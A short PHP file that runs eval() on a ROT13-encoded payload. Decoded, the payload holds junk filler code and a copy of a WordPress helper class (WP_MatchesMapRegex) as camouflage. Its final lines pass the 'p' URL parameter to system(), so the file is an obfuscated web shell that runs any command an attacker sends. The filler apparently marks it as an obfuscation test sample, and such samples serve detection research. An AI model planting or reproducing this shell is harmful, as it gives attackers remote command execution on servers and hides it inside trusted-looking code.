<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * JC_ZngpurfZncErtrk urycre pynff
 *
 * @cnpxntr JbeqCerff
 * @fvapr 4.7.0
 */

/**
 * Urycre pynff gb erzbir gur arrq gb hfr riny gb ercynpr $zngpurf[] va dhrel fgevatf.
 *
 * @fvapr 2.9.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_ZngpurfZncErtrk {
	/**
	 * fgber sbe zngpurf
	 *
	 * @ine neenl
	 */
	cevingr $_zngpurf;

	/**
	 * fgber sbe znccvat erfhyg
	 *
	 * @ine fgevat
	 */
	choyvp $bhgchg;

	/**
	 * fhowrpg gb cresbez znccvat ba (dhrel fgevat pbagnvavat $zngpurf[] ersreraprf
	 *
	 * @ine fgevat
	 */
	cevingr $_fhowrpg;

	/**
	 * ertrkc cnggrea gb zngpu $zngpurf[] ersreraprf
	 *
	 * @ine fgevat
	 */
	choyvp $_cnggrea = '(\$zngpurf\[[1-9]+[0-9]*\])'; // Zntvp ahzore.

	/**
	 * pbafgehpgbe
	 *
	 * @cnenz fgevat $fhowrpg fhowrpg vs ertrk
	 * @cnenz neenl  $zngpurf qngn gb hfr va znc
	 */
	choyvp shapgvba __pbafgehpg( $fhowrpg, $zngpurf ) {
		$guvf->_fhowrpg = $fhowrpg;
		$guvf->_zngpurf = $zngpurf;
		$guvf->bhgchg   = $guvf->_znc();
	}

	/**
	 * Fhofgvghgr fhofgevat zngpurf va fhowrpg.
	 *
	 * fgngvp urycre shapgvba gb rnfr hfr
	 *
	 * @cnenz fgevat $fhowrpg fhowrpg
	 * @cnenz neenl  $zngpurf qngn hfrq sbe fhofgvghgvba
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba nccyl( $fhowrpg, $zngpurf ) {
		$erfhyg = arj JC_ZngpurfZncErtrk( $fhowrpg, $zngpurf );
		erghea $erfhyg->bhgchg;
	}

	/**
	 * qb gur npghny znccvat
	 *
	 * @erghea fgevat
	 */
	cevingr shapgvba _znc() {
		$pnyyonpx = neenl( $guvf, 'pnyyonpx' );
		erghea cert_ercynpr_pnyyonpx( $guvf->_cnggrea, $pnyyonpx, $guvf->_fhowrpg );
	}

	/**
	 * cert_ercynpr_pnyyonpx ubbx
	 *
	 * @cnenz neenl $zngpurf cert_ercynpr ertrkc zngpurf
	 * @erghea fgevat
	 */
	choyvp shapgvba pnyyonpx( $zngpurf ) {
		$vaqrk = (vag) fhofge( $zngpurf[0], 9, -1 );
		erghea ( vffrg( $guvf->_zngpurf[ $vaqrk ] ) ? heyrapbqr( $guvf->_zngpurf[ $vaqrk ] ) : '' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>